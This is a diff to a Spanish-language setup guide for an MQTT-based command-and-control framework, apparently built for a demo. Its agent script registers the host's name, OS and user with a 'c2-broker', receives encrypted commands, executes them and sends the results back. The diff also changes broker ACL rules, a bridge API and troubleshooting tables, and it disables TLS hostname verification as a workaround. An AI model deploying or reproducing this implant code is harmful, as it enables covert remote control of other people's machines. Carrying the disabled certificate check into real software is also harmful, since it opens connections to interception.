@@ -302,22 +302,42 @@ with open(PSK_FILE, "rb") as f:
     key = f.read()
 cipher = Cipher(key, state_file=STATE_FILE)
 
-# ── Inicializar MQTT ──
-client = mqtt.Client(client_id=AGENT_ID)
+# ── Inicializar MQTT (V2 callback + MQTT5 para validación contra broker) ──
+client = mqtt.Client(
+    client_id=AGENT_ID,
+    callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
+    protocol=mqtt.MQTTv5,
+)
 client.tls_set("ca.crt", certfile=f"{AGENT_ID}.crt", keyfile=f"{AGENT_ID}.key")
+# El server cert tiene CN=c2-broker. Si conectás por IP/hostname distinto,
+# necesitás saltear la verificación de hostname:
+client.tls_insecure_set(True)
+client.reconnect_delay_set(min_delay=1, max_delay=30)
 
 # ── Callbacks ──
-def on_connect(client, userdata, flags, rc):
+def on_connect(client, userdata, flags, rc, properties=None):
     """Al conectarse: suscribirse a comandos y registrar presencia."""
+    if rc != 0:
+        print(f"Error de conexión MQTT (rc={rc})")
+        return
     client.subscribe(f"c2/cmd/{AGENT_ID}", qos=1)
 
     # Register: plano (solo TLS), metadata pública
-    client.publish("c2/agents/register", json.dumps({
+    info = client.publish("c2/agents/register", json.dumps({
         "agent_id": AGENT_ID,
         "hostname": socket.gethostname(),
         "os": f"{platform.system()} {platform.release()}",
         "username": getpass.getuser(),
     }), qos=1)
+    # NOTA: publish() rc=0 solo significa "encolado".
+    # La aceptación del broker se recibe en on_publish.
+
+def on_publish(client, userdata, mid, reason_code, properties=None):
+    """Verifica que el broker haya aceptado cada publicación.
+    reason_code < 128 → éxito; >= 128 → error (ej: ACL denegó).
+    """
+    if reason_code >= 128:
+        print(f"⚠️ Broker rechazó publicación (mid={mid}, rc={reason_code})")
 
 def on_message(client, userdata, msg):
     """Al recibir un comando: descifrar, ejecutar, cifrar resultado."""
@@ -351,6 +371,7 @@ def ejecutar_comando(comando: str) -> str:
         return str(e)
 
 client.on_connect = on_connect
+client.on_publish = on_publish
 client.on_message = on_message
 client.connect(MQTT_HOST, MQTT_PORT)
 client.loop_forever()
@@ -423,12 +444,14 @@ Respuesta:
 
 ```json
 {
-  "status": "published",
+  "status": "accepted",
   "topic": "c2/cmd/AG001",
   "task_id": "TASK001",
   "agent_id": "AG001"
 }
 ```
+
+> 💡 La respuesta es `202 Accepted` — el bridge encoló el mensaje, pero la entrega al broker es asíncrona (QoS 1). Si el broker rechaza el mensaje (ACL), se loguea en el bridge.
 
 ### Recibir resultados (GET /api/results)
 
@@ -546,43 +569,33 @@ pueden publicar y suscribirse a cada tópico. Las reglas usan `%u` que es
 el username del cliente (en nuestro caso, el CN del certificado).
 
 ```aconf
-# ========================================
 # ACL para C2 - Sarabhel
-# ========================================
+# %u = username (CN del certificado), %c = client_id
 
-# ---- Agentes ----
-# Cualquier agente puede registrar su presencia
-pattern write c2/agents/register
-
-# Un agente SOLO puede leer comandos para su propio ID
-pattern read c2/cmd/%u
-
-# Un agente SOLO puede escribir resultados con su propio ID
-pattern write c2/res/%u
-
-# ---- Bridge ----
-# El bridge necesita permisos amplios para orquestar
-user crypto-bridge
-topic write c2/cmd/#
-topic read c2/res/#
-topic read c2/agents/register
-
-# ---- n8n Server (si se conecta directo) ----
+# ---- n8n: orquestación remota ----
 user n8n-server
 topic write c2/cmd/#
 topic read c2/res/#
 topic read c2/agents/register
 
-# ---- Denegar todo lo demás ----
-topic deny c2/#
+# ---- Bridge HTTP: proxy criptográfico entre n8n y MQTT ----
+user crypto-bridge
+topic write c2/cmd/#
+topic read c2/res/#
+topic read c2/agents/register
+
+# ---- Reglas anónimas (aplican a todos los clientes) ----
+pattern write c2/agents/register
+pattern read c2/cmd/%u
+pattern write c2/res/%u
 ```
 
 ### Cómo funciona
 
 | Cliente | Puede hacer | No puede hacer |
 |---|---|---|
-| **AG001** (CN=AG001) | Leer `c2/cmd/AG001`, escribir `c2/res/AG001` | Leer comandos de AG002, escribir en tópicos de otros |
-| **AG002** (CN=AG002) | Leer `c2/cmd/AG002`, escribir `c2/res/AG002` | Igual, aislado de AG001 |
+| **AG001** (CN=AG001) | Escribir `c2/agents/register`, leer `c2/cmd/AG001`, escribir `c2/res/AG001` | Leer comandos de AG002, escribir en tópicos de otros |
+| **AG002** (CN=AG002) | Escribir `c2/agents/register`, leer `c2/cmd/AG002`, escribir `c2/res/AG002` | Igual, aislado de AG001 |
 | **crypto-bridge** | Publicar en cualquier `c2/cmd/#`, leer cualquier `c2/res/#` | N/A (tiene todos los permisos que necesita) |
 
 ---
@@ -669,7 +682,7 @@ Los errores que matan tiempo en la demo, ordenados por probabilidad de ocurrenci
 
 | Error | Síntoma | Solución |
 |---|---|---|
-| **Bridge no conecta al broker** | `/api/health` → `mqtt_connected: false` | Verificar que el broker esté corriendo, que `bridge.crt` y `bridge.key` existan y estén firmados por la CA |
+| **Bridge no conecta al broker (cert CN ≠ hostname)** | `/api/health` → `mqtt_connected: false`, log: `hostname mismatch` | El server cert tiene `CN=c2-broker`. Si el bridge conecta a `localhost`, el hostname no coincide. El bridge ya incluye `tls_insecure_set(True)` para desarrollo. En producción, usar un DNS que resuelva al CN del cert o regenerar el cert con SAN. |
 | **n8n no llega al bridge** | `Connection refused` desde n8n | `curl http://localhost:5000/api/health` desde la misma máquina que n8n |
 | **Bridge no encuentra PSK** | `PSK file not found: crypto_lib/psk.key` | `python3 crypto_lib/cipher.py genkey crypto_lib/psk.key` o apuntar `PSK_FILE` a la ruta correcta |
 
@@ -746,6 +759,7 @@ c2-broker/                         ← Directorio raíz del C2 Broker
 ├── crypto_lib/                     ← Módulo de cifrado AES-256-GCM
 │   ├── __init__.py                 ←   Exporta Cipher, generate_key
 │   ├── cipher.py                   ←   Implementación AES-GCM con nonce persistence
+│   ├── test_cipher.py              ←   Tests unitarios de cipher.py
 │   └── psk.key                     ←   PSK (NO versionar)
 │
 ├── scripts/                        ← Utilidades
